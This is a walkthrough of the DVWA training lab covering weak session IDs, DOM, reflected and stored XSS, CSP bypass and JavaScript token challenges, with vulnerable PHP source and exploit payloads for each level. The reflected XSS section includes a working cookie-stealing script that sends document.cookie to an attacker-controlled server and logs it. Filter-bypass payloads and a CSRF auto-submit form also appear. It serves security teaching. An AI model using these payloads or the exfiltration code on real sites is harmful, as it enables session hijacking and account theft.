Authentication methods such as passwords and certificates are generally only used in the login process. After the login is completed, the user accesses the page of the website, and it is impossible to use the password authentication again every time the browser requests the page. Therefore, when the authentication After completion, you need to replace a credential that is transparent to the user. This credential is SessionID.

When the user login is complete, a new session (Session) will be created on the server side, and the user's status and related information will be saved in the session. The server side maintains the Session of all online users. At this time, the authentication only needs to know which The user can just browse the current page. In order to tell the server which Session to use, the browser needs to inform the server of the SessionID held by the current user. The most common way is to encrypt the SessionID and save it in the Cookie, because the Cookie will follow The HTTP request header is sent and is protected by the browser's same-origin policy.

Once the SessionID is stolen during the life cycle, it is equivalent to account theft. At the same time, since the SessionID is an authentication credential held after the user logs in, hackers do not need to attack the login process (such as passwords). Session hijacking is a way to steal users After using the SessionID, use the SessionID to log into the target account. At this time, the attacker actually uses the valid Session of the target account. If the SessionID is saved in the Cookie, this attack can be called Cookie hijacking. SessionID also It can be saved in the URL as a parameter of a request, but the security of this method is difficult to withstand the test.

Therefore, when generating SessionID, it is necessary to ensure sufficient randomness, such as using a sufficiently strong pseudo-random number generation algorithm.

The essence of SessionID utilization

SessionID is the only content required to access the site as a specific user after logging in. If the SessionID can be calculated or easily guessed, the attacker will be able to easily gain access, directly enter the specific user interface without the login password, and then find other vulnerabilities Such as XSS, file upload, etc.

This module uses four different ways to set the dvwaSession's cookie value, the goal of each level is to calculate how the ID was generated, and then infer the ID of other admin users.

Low
Server-side core code




<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>

It can be seen that dvwaSession starts from 0 and increases by 1 each time.

exploit

Simulate administrator login, in browser 1, click Generate, Burpsuite captures packets, sends them to Repeater, go once



In the request header:

Cookie: dvwaSession=17; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

In the response header:

Set-Cookie: dvwaSession=18

Go several times, and found that dvwaSession has been increasing, adding 1 each time. Malicious attackers found the above rules and used browser 2 to successfully construct the payload:

Cookie: dvwaSession=18; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

Note: The cookie value here should be calculated according to your own dvwaSession

In the case of no password authentication, successfully log in to the interface: http://<IP address!!!>/vulnerabilities/weak_id/



Medium
Server-side core code

<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
?>



As can be seen from the code, the value of the cookie is derived from the time

exploit

Simulate administrator login, in browser 1, click Generate, and find in burp:



In the request header:

Cookie: dvwaSession=19; security=medium; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

In the response header:

Set-Cookie: dvwaSession=1561346895

Go several times and found that the dvwaSession and the timestamp change are consistent. Here, it is recommended to search for the unix timestamp by yourself

Malicious attackers find the above rules and use browser 2 to successfully construct the payload:

Cookie: dvwaSession=1561347450; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2; security=medium

Note: The cookie value here should be calculated according to your own current time

In the case of no password authentication, successfully log in to the interface: http://<IP address!!!>/vulnerabilities/weak_id/



High
Server-side core code


<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}

?>




PHP setcookie() function

setcookie(name, value, expire, path, domain, secure, httponly)

Parameter Description
name Required. Specifies the name of the cookie.
value Required. Specifies the value of the cookie.
expire Optional. Specifies the expiration date of the cookie.
path is optional. Specifies the server path of the cookie.
domain is optional. Specifies the domain name of the cookie.
secure Optional. Specifies whether to transmit cookies over a secure HTTPS connection.
httponly Optional. Specifies whether the cookie can only be accessed through the HTTP protocol.
It can be seen from the source code:

  value value: last_session_id_high is incremented by 1, and then encrypted with md5
  expire value: add one hour to the current time
  path value: /vulnerabilities/weak_id/
exploit

Simulate administrator login, in browser 1, click Generate, and find in burp:



In the request header:

Cookie: dvwaSession=19; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

In the response header:

Set-Cookie: dvwaSession=c4ca4238a0b923820dcc509a6f75849b; expires=Mon, 24-Jun-2019 04:56:58 GMT;

Go several times and find that the dvwaSession value is encrypted by MD5. Decrypt the MD5 generated each time, and find the decrypted value. It is found that it is added from 0, just like the code in the low level.

Malicious attackers find the above rules and use browser 2 to successfully construct the payload:

Cookie: dvwaSession=1F0E3DAD99908345F7439F8FFABDFFC4; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2

Note: The cookie value here should be calculated according to your own dvwaSession md5

http://<IP address!!!>/vulnerabilities/weak_id/



Impossible
Server-side core code

<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible");
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
?>


$cookie_value adopts random number + timestamp + fixed string "Impossible", and then performs sha1 operation, and the value of dvwaSession cannot be guessed at all. User security session authentication is realized.

XSS
XSS, the full name of Cross Site Scripting, is a cross-site scripting attack. In a sense, it is also an injection attack. It means that the attacker injects malicious script code into the page. It should be emphasized that XSS is not limited to JavaScript, but also includes other scripting languages such as flash. According to whether the malicious code is stored in the server, XSS can be divided into stored XSS and reflective XSS.

Due to its particularity, DOM-type XSS is often classified into the third type, which is a DOM tree-based XSS. For example, the server often uses functions such as document.boby.innerHtml to dynamically generate html pages. If these functions refer to a certain When some variables are not filtered or checked, DOM-type XSS will be generated. DOM-type XSS may be storage type or reflection type.



XSS (DOM)
DOM, the full name of Document Object Model, is a platform- and language-neutral interface that enables programs and scripts to dynamically access and update the content, structure, and style of documents.

DOM-type XSS is actually a special type of reflection-type XSS, which is a vulnerability based on the DOM document object model.

There are many page elements in the website page. When the page reaches the browser, the browser will create a top-level Document object document object for the page, and then generate each sub-document object. Each page element corresponds to a document object. Each document object Contains properties, methods and events. JS scripts can be used to edit the document object to modify the elements of the page. That is to say, the script program of the client can dynamically modify the content of the page through the DOM, obtain the data in the DOM from the client and store it locally Execution. Based on this feature, you can use JS scripts to exploit XSS vulnerabilities.

Attributes that can trigger DOM-style XSS


document. referer Property
window.name Property
location attribute
innerHTML attribute
document.write Property
Low
Server-side core code

<?php

# No protections, anything goes

?>
Simple and straightforward, I told you everything without any protection

exploit

http://<IP address!!!>/vulnerabilities/xss_d/?default=English<script>alert(/xss/);</script>

Medium
Server-side core code

<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];

    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>


Related function introduction

The array_key_exists() function checks whether the specified key exists in an array, returns true if the key exists, and returns false if the key does not exist.

The stripos() function finds the first occurrence of a string within another string

exploit

There is no need to use <script> for another method

http://<IP address!!!>/vulnerabilities/xss_d/?default=English<input onfocus="alert('xss');" autofocus>

High
Server-side core code


<?php
// Is there any input?
if (array_key_exists("default", $_GET) && !is_null($_GET['default'])) {
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header("location: ?default=English");
            exit;
    }
}



A whitelist is used here, but there is no use for birds

exploit

http://<IP address!!!>/vulnerabilities/xss_d/?default=English #<script>alert(/xss/)</script>

Impossible
Server-side core code

<?php

# Don't need to do anything, protection handled on the client side

?>
XSS (Reflected)
Reflective XSS, non-persistent, needs to deceive users to click on the XSS code link with specific parameters to trigger it (there is no such page and content in the server), and it is generally easy to appear on the search page.

Low
Server-side core code

<?php
header("X-XSS-Protection: 0");
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET['name'] . '</pre>';
}


It can be seen that the code directly uses the get method to pass in the name parameter without any filtering and checking, and there are obvious XSS vulnerabilities.

exploit

<script>alert(/xss/)</script> , successful popup:

Corresponding XSS link

http://<IP address!!!>/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#

Actual use of stealing user cookies to enter the background

Constructed in the attacker's own website http://<server B>/xss/

hacker.js

var img = new Image();
img.src="http://<服务器B>/xss/hacker.php?x=" + document.cookie;
document.body.append(img);


hacker.php

<?php
$cookie = $_GET['x'];
file_put_contents('cookie.txt', $cookie);
?>


So the xss payload inserted into dvwa is <script src="http://<server B>/xss/hacker.js" /></script>

XSS exploit, get cookies



Medium
Server-side core code

<?php
header("X-XSS-Protection: 0");
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Get input
    $name = str_replace('<script>', '', $_GET['name']);
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}



It can be seen that the input is filtered here. Based on the idea of blacklist, the str_replace function is used to delete the <script> in the input. This protection mechanism can be easily bypassed.

exploit

double write bypass
Enter <sc<script>ript>alert(/xss/)</script>, a successful pop-up box:

Corresponding XSS link: http://<IP address!!!>/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#

case confusion bypass
Enter <ScRipt>alert(/xss/)</script>, a successful pop-up box:

Corresponding XSS link: http://<IP address!!!>/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#

High
Server-side core code


<?php
header("X-XSS-Protection: 0");
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Get input
    $name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name']);
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}



It can be seen that the code at the High level also uses a blacklist to filter input, and the preg_replace() function is used to search and replace regular expressions, which enables double-writing bypass and case confusion bypass (i in regular expressions means indiscriminate case) is no longer valid.

exploit

Although the <script> tag cannot be used to inject XSS code, malicious js code can be injected through the events of tags such as img and body or the src of tags such as iframe.

Enter <img src=1 onerror=alert(/xss/)> or <input onfocus="alert('xss');" autofocus> , a successful pop-up box

Impossible
Server-side core code

<?php
// Is there any input?
if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Check Anti-CSRF token
    checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');
    // Get input
    $name = htmlspecialchars($_GET['name']);
    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
// Generate Anti-CSRF token
generateSessionToken();


It can be seen that the Impossible level code uses the htmlspecialchars function to convert the predefined characters &, ", ', <, > into HTML entities, preventing browsers from treating them as HTML elements.

XSS (Stored)
Low
Server-side core code

<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>



It can be seen that there is no XSS filtering and checking on the input, and it is stored in the database, so there is an obvious stored XSS vulnerability here.

Related function introduction

trim(string,charlist)

Remove blank characters or other predefined characters on both sides of the string. The predefined characters include , \t, \n, \x0B, \r and spaces. The optional parameter charlist supports adding additional characters that need to be deleted.

mysql_real_escape_string(string, connection)

The function escapes the special symbols \x00,\n,\r,\,‘,",\x1a in the string.

stripslashes(string)

Function removes backslashes in a string.

exploit

There is a limit on the number of characters in the front end of the name column, you can directly modify the front-end code, or you can modify it by capturing packets



Enter <script>alert(/xss/)</script> in the message column, and the box will pop up successfully

Medium
Server-side core code

<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>



Related function introduction

The strip_tags() function strips HTML, XML, and PHP tags from a string, but allows the use of <b> tags.

The addslashes() function returns a string with backslashes added before predefined characters (single quote, double quote, backslash, NULL).

It can be seen that since the htmlspecialchars function is used to encode the message parameter, XSS code can no longer be injected through the message parameter, but for the name parameter, the <script> string is simply filtered, and stored XSS still exists.

exploit

double write bypass

Directly modify the front-end code and change the name parameter to <sc<script>ript>alert(/xss/)</script> , and the box will pop up successfully

case confusion bypass

Directly modify the front-end code and change the name parameter to <Script>alert(/xss/)</script> , and the box will pop up successfully

High
Server-side core code



<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>


It can be seen that the regular expression is used to filter the <script> tag, but other dangerous tags such as img and iframe are ignored, so the name parameter still has stored XSS.

exploit

Directly modify the front-end code and change the name parameter to <img src=1 onerror=alert(/xss/)> , a successful pop-up box

Impossible
Server-side core code


<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>


It can be seen that XSS is solved by using the htmlspecialchars function, but it should be noted that if the htmlspecialchars function is used improperly, the attacker can bypass the function to inject XSS through coding, especially DOM-type XSS.

CSP_Bypass
CSP is the security policy of the browser. If there is a Content-Security-Policy label in the label or the HTTP header returned by the server, the browser will determine which resources can be loaded or executed according to the content in the label.

CSP related tutorials: https://www.ruanyifeng.com/blog/2016/09/csp.html

The requirements in DVWA are also very simple, input trusted resources, and then the resources can be loaded or executed.

Low
Server-side core code

<?php
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;";
// allows js from self, pastebin.com, jquery and google analytics.
header($headerCSP);
# https://pastebin.com/raw/R570EE00
if (isset($_POST['include'])) {
    $page['body'] .= "\r\n    <script src='" . $_POST['include'] . "'></script>\r\n";
}
$page['body'] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';

If you don't look at the source code, look at the inspector (F12), and you can also know some trusted websites.



Which website is pastebin? A website for quickly sharing text content, what if the content of the text is a piece of js code?

The source code prompts us, enter https://pastebin.com/raw/VqHmJKjr and its content is alert(document.cookie)



So how can we attack? You can use CSRF


<form action="http://<IP地址!!!>
	/dvwa/vulnerabilities/csp/" id="csp" method="post">
	<input type="text" name="include" value=""/>
</form>
<script>
var form = document.getElementById("csp");
form[0].value="https://pastebin.com/raw/VqHmJKjr";
form.submit();
</script>



Medium
Server-side core code


<?php
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
header($headerCSP);
// Disable XSS protections so that inline alert boxes will work
header("X-XSS-Protection: 0");
# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
if (isset($_POST['include'])) {
    $page['body'] .= "\r\n    " . $_POST['include'] . "\r\n";
}
$page['body'] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';

The problem with the intermediate level is the use of the 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' tag,

That is to say, if you enter <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>, the injection will be successful.

High
Server-side core code



<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";
header($headerCSP);
if (isset($_POST['include'])) {
    $page['body'] .= "\r\n    " . $_POST['include'] . "\r\n";
}
$page['body'] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';

Advanced has changed the form, clicking the button will get the answer, and the answer is obtained by JSONP (commonly used for cross-requests) and cps is also set to only trust its own domain name Content-Security-Policy: script-src 'self';

The logic of sending the request after clicking is in vulnerabilities/csp/source/high.js


function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}



Let's talk about the logic here.

After the client clicks the button, a tag like <script src="<IP address!!!>/vulnerabilities/csp/source/jsonp.php?callback=solveSum"></script> will be created in the html
Because script is different from ajax, it can be sent across domains
The server returns solveSum({"answer":"15"}) according to the callback request, and then you can call solveSum in high.js.


But what if someone changed the callback parameter to callback=alert(document.cookie) ? will return alert(document.cookie)//({"answer":"15"}) ... so this is an injection point





Impossible
Server-side core code

<?php

$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.</p><p>The CSP settings only allow external JavaScript on the local server and no inline code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/impossible.js"></script>
';


There is no callback in the url, and the background is written to death

JavaScript_Attacks
Submit the word "success" to win. No, what about CTF?



Low
Server-side core code


<?php
$page[ 'body' ] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n) {
 "use strict";

 function t(n, t) {
  var r = (65535 & n) + (65535 & t);
  return (n >> 16) + (t >> 16) + (r >> 16) << 16 | 65535 & r
 }

 function r(n, t) {
  return n << t | n >>> 32 - t
 }

 function e(n, e, o, u, c, f) {
  return t(r(t(t(e, n), t(u, f)), c), o)
 }

 function o(n, t, r, o, u, c, f) {
  return e(t & r | ~t & o, n, t, u, c, f)
 }

 function u(n, t, r, o, u, c, f) {
  return e(t & o | r & ~o, n, t, u, c, f)
 }

 function c(n, t, r, o, u, c, f) {
  return e(t ^ r ^ o, n, t, u, c, f)
 }

 function f(n, t, r, o, u, c, f) {
  return e(r ^ (t | ~o), n, t, u, c, f)
 }

 function i(n, r) {
  n[r >> 5] |= 128 << r % 32, n[14 + (r + 64 >>> 9 << 4)] = r;
  var e, i, a, d, h, l = 1732584193,
   g = -271733879,
   v = -1732584194,
   m = 271733878;
  for (e = 0; e < n.length; e += 16) i = l, a = g, d = v, h = m, g = f(g = f(g = f(g = f(g = c(g = c(g = c(g = c(g = u(g = u(g = u(g = u(g = o(g = o(g = o(g = o(g, v = o(v, m = o(m, l = o(l, g, v, m, n[e], 7, -680876936), g, v, n[e + 1], 12, -389564586), l, g, n[e + 2], 17, 606105819), m, l, n[e + 3], 22, -1044525330), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 4], 7, -176418897), g, v, n[e + 5], 12, 1200080426), l, g, n[e + 6], 17, -1473231341), m, l, n[e + 7], 22, -45705983), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 8], 7, 1770035416), g, v, n[e + 9], 12, -1958414417), l, g, n[e + 10], 17, -42063), m, l, n[e + 11], 22, -1990404162), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 12], 7, 1804603682), g, v, n[e + 13], 12, -40341101), l, g, n[e + 14], 17, -1502002290), m, l, n[e + 15], 22, 1236535329), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 1], 5, -165796510), g, v, n[e + 6], 9, -1069501632), l, g, n[e + 11], 14, 643717713), m, l, n[e], 20, -373897302), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 5], 5, -701558691), g, v, n[e + 10], 9, 38016083), l, g, n[e + 15], 14, -660478335), m, l, n[e + 4], 20, -405537848), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 9], 5, 568446438), g, v, n[e + 14], 9, -1019803690), l, g, n[e + 3], 14, -187363961), m, l, n[e + 8], 20, 1163531501), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 13], 5, -1444681467), g, v, n[e + 2], 9, -51403784), l, g, n[e + 7], 14, 1735328473), m, l, n[e + 12], 20, -1926607734), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 5], 4, -378558), g, v, n[e + 8], 11, -2022574463), l, g, n[e + 11], 16, 1839030562), m, l, n[e + 14], 23, -35309556), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 1], 4, -1530992060), g, v, n[e + 4], 11, 1272893353), l, g, n[e + 7], 16, -155497632), m, l, n[e + 10], 23, -1094730640), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 13], 4, 681279174), g, v, n[e], 11, -358537222), l, g, n[e + 3], 16, -722521979), m, l, n[e + 6], 23, 76029189), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 9], 4, -640364487), g, v, n[e + 12], 11, -421815835), l, g, n[e + 15], 16, 530742520), m, l, n[e + 2], 23, -995338651), v = f(v, m = f(m, l = f(l, g, v, m, n[e], 6, -198630844), g, v, n[e + 7], 10, 1126891415), l, g, n[e + 14], 15, -1416354905), m, l, n[e + 5], 21, -57434055), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 12], 6, 1700485571), g, v, n[e + 3], 10, -1894986606), l, g, n[e + 10], 15, -1051523), m, l, n[e + 1], 21, -2054922799), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 8], 6, 1873313359), g, v, n[e + 15], 10, -30611744), l, g, n[e + 6], 15, -1560198380), m, l, n[e + 13], 21, 1309151649), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 4], 6, -145523070), g, v, n[e + 11], 10, -1120210379), l, g, n[e + 2], 15, 718787259), m, l, n[e + 9], 21, -343485551), l = t(l, i), g = t(g, a), v = t(v, d), m = t(m, h);
  return [l, g, v, m]
 }

 function a(n) {
  var t, r = "",
   e = 32 * n.length;
  for (t = 0; t < e; t += 8) r += String.fromCharCode(n[t >> 5] >>> t % 32 & 255);
  return r
 }

 function d(n) {
  var t, r = [];
  for (r[(n.length >> 2) - 1] = void 0, t = 0; t < r.length; t += 1) r[t] = 0;
  var e = 8 * n.length;
  for (t = 0; t < e; t += 8) r[t >> 5] |= (255 & n.charCodeAt(t / 8)) << t % 32;
  return r
 }

 function h(n) {
  return a(i(d(n), 8 * n.length))
 }

 function l(n, t) {
  var r, e, o = d(n),
   u = [],
   c = [];
  for (u[15] = c[15] = void 0, o.length > 16 && (o = i(o, 8 * n.length)), r = 0; r < 16; r += 1) u[r] = 909522486 ^ o[r], c[r] = 1549556828 ^ o[r];
  return e = i(u.concat(d(t)), 512 + 8 * t.length), a(i(c.concat(e), 640))
 }

 function g(n) {
  var t, r, e = "";
  for (r = 0; r < n.length; r += 1) t = n.charCodeAt(r), e += "0123456789abcdef".charAt(t >>> 4 & 15) + "0123456789abcdef".charAt(15 & t);
  return e
 }

 function v(n) {
  return unescape(encodeURIComponent(n))
 }

 function m(n) {
  return h(v(n))
 }

 function p(n) {
  return g(m(n))
 }

 function s(n, t) {
  return l(v(n), v(t))
 }

 function C(n, t) {
  return g(s(n, t))
 }

 function A(n, t, r) {
  return t ? r ? s(t, n) : C(t, n) : r ? m(n) : p(n)
 }
 "function" == typeof define && define.amd ? define(function() {
  return A
 }) : "object" == typeof module && module.exports ? module.exports = A : n.md5 = A
}(this);

    function rot13(inp) {
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
    }

    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
</script>
EOF;
?>


In fact, a token is generated, which is encrypted by md5. This code is in JavaScript, which is generated by the front desk.

If you change it to "success" and submit it, this will appear, Invalid token. What's going on?

You can open the console (F12) to see the situation. You will see that the token is not generated in the background, but generated in the foreground... and the token generated in the foreground is made with md5("ChangeMe") , and the md5 expected by the background is md5("success").



Know what happened? There is a token in the parameter, and then compare it with md5(str_rot13("success")), if it is the same, it will give you well done.

Open the developer tool of the browser, first enter success on the interface, and then execute the function generate_token() in the console to submit, and it is successful.



Note: Enter success first and then generate_token()

Medium
Server-side core code

<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/medium.js"></script>
EOF;
?>


The idea is the same, but the function of generating token is placed in another js file.

function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}


